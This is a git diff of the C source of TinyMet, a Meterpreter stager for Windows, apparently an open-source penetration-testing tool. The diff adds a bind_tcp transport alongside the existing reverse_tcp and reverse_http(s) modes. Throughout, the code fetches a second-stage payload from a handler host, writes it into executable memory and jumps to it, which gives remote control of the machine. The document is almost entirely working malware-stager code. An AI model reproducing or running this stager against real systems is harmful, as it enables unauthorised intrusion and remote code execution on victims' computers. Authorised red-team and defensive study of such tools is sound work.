@@ -1,3 +1,41 @@
+﻿//بسم الله الرحمن الرحيم
+/************************************************
+*					  [TinyMet]					*
+*		The Tiny Meterpreter Executable		*
+*************************************************
+- @SherifEldeeb
+- http://tinymet.com
+- http://eldeeb.net
+- Made in Egypt :)
+************************************************/
+/*
+Copyright (c) 2014, Sherif Eldeeb "eldeeb.net"
+All rights reserved.
+
+Redistribution and use in source and binary forms, with or without
+modification, are permitted provided that the following conditions are met:
+
+1. Redistributions of source code must retain the above copyright notice, this
+list of conditions and the following disclaimer.
+2. Redistributions in binary form must reproduce the above copyright notice,
+this list of conditions and the following disclaimer in the documentation
+and/or other materials provided with the distribution.
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
+ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
+ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
+ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
+(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
+SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
+The views and conclusions contained in the software and documentation are those
+of the authors and should not be interpreted as representing official policies,
+either expressed or implied, of the FreeBSD Project.
+*/
 #include <WinSock2.h>
 #include <Wininet.h>
 #include <Windows.h>
@@ -18,6 +56,7 @@ void err_exit(char* message){
 	printf("\nError: %s\nGetLastError:%d", message, GetLastError());
 	exit(-1);
 }
+
 void gen_random(char *s, const int len) { // ripped from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
 	static const char alphanum[] =
 		"0123456789"
@@ -41,14 +80,19 @@ int TextChecksum8(char* text)
 	return temp % 0x100;
 }
 
-unsigned char* rev_tcp(char* host, char* port)
+unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 {
 
 	WSADATA wsaData;
+
 	SOCKET sckt;
+	SOCKET cli_sckt;
+	SOCKET buffer_socket;
+
 	struct sockaddr_in server;
 	hostent *hostName;
 	int length = 0;
+	int location = 0;
 
 	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
 		err_exit("WSAStartup");
@@ -68,31 +112,47 @@ unsigned char* rev_tcp(char* host, char* port)
 	server.sin_port = sPORT;
 
 	sckt = socket(AF_INET, SOCK_STREAM, NULL);
+
 	if (sckt == INVALID_SOCKET){
 		err_exit("socket()");
 	}
 
-	if (connect(sckt, (sockaddr*)&server, sizeof(server)) != 0){
-		err_exit("connect()");
+	//////////////////////////////
+	if (bind_tcp){
+		if (bind(sckt, (struct sockaddr *)&server, sizeof(struct sockaddr)) != 0) {
+			err_exit("bind()");
+		}
+		if (listen(sckt, SOMAXCONN) != 0) {
+			err_exit("listen()");
+		}
+		if ((cli_sckt = accept(sckt, NULL, NULL)) == INVALID_SOCKET)
+		{
+			err_exit("accept()");
+		}
+		buffer_socket = cli_sckt;
 	}
-
-	recv(sckt, (char*)&bufSize, 4, 0);
+	//
+	else {
+		if (connect(sckt, (sockaddr*)&server, sizeof(server)) != 0){
+			err_exit("connect()");
+		}
+		buffer_socket = sckt;
+	}
+	//////////////////////////////
+	recv(buffer_socket, (char*)&bufSize, 4, 0);
 
 	buf = (unsigned char*)VirtualAlloc(buf, bufSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	buf[0] = 0xbf;
-	strncpy((char*)buf + 1, (const char*)&sckt, 4);
+	strncpy((char*)buf + 1, (const char*)&buffer_socket, 4);
 
 	length = bufSize;
-	int location = 0;
 	while (length != 0){
 		int received = 0;
-
-		received = recv(sckt, ((char*)(buf + 5 + location)), length, 0);
-
+		received = recv(buffer_socket, ((char*)(buf + 5 + location)), length, 0);
 		location = location + received;
 		length = length - received;
 	}
-
+	//////////////////////////////
 	return buf;
 }
 
@@ -103,7 +163,7 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	//	3) Prepare buffer for the stage with WinInet: InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.
 	//	4) Return pointer to the populated buffer to caller function.
 	//***************************************************************//
-	
+
 	// Variables
 	char URI[5] = { 0 };			//4 chars ... it can be any length actually.
 	char FullURL[6] = { 0 };	// FullURL
@@ -194,8 +254,6 @@ char* WcharToChar(wchar_t* orig){
 	return nstring;
 }
 
-
-
 // not needed anymore ... kept for future reference :)
 //wchar_t* CharToWchar(char* orig){
 //	size_t newsize = strlen(orig) + 1;
@@ -203,6 +261,7 @@ char* WcharToChar(wchar_t* orig){
 //	mbstowcs(wcstring, orig, newsize);
 //	return wcstring;
 //}
+
 
 int main()
 {
@@ -214,7 +273,10 @@ int main()
 		"    0: reverse_tcp\n"
 		"    1: reverse_http\n"
 		"    2: reverse_https\n"
-		"\nExample:\n \"tinymet.exe 2 handler.com 443\"\nwill use reverse_https and connect to host.com:443\n";
+		"    3: bind_tcp\n"
+		"\nExample:\n"
+		"\"tinymet.exe 2 handler.com 443\"\nwill use reverse_https and connect to host.com:443\n";
+		//"\"tinymet.exe 3 0.0.0.0 4444\"\nwill bind_tcp port 4444 on all interfaces.\n";
 
 	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
 
@@ -232,7 +294,7 @@ int main()
 	}
 
 	// convert wchar_t to mb
-	char* TRANSPORT	= WcharToChar(szArglist[1]);
+	char* TRANSPORT = WcharToChar(szArglist[1]);
 	char* LHOST = WcharToChar(szArglist[2]);
 	char* LPORT = WcharToChar(szArglist[3]);
 
@@ -241,7 +303,7 @@ int main()
 	// pick transport ...
 	switch (TRANSPORT[0]) {
 	case '0':
-		buf = rev_tcp(LHOST, LPORT);
+		buf = met_tcp(LHOST, LPORT, FALSE);
 		break;
 	case '1':
 		buf = rev_http(LHOST, LPORT, FALSE);
@@ -249,14 +311,15 @@ int main()
 	case '2':
 		buf = rev_http(LHOST, LPORT, TRUE);
 		break;
+	case '3':
+		buf = met_tcp(LHOST, LPORT, TRUE);
+		break;
 	default:
 		printf(helpText);
-		err_exit("Transport should be 0,1 or 2"); // transport is not 0,1 or 2
+		err_exit("Transport should be 0,1,2 or 3"); // transport is not valid
 	}
-	
-	FreeConsole();
 
 	(*(void(*)())buf)();
-	err_exit(0);
+	exit(0);
 }
 
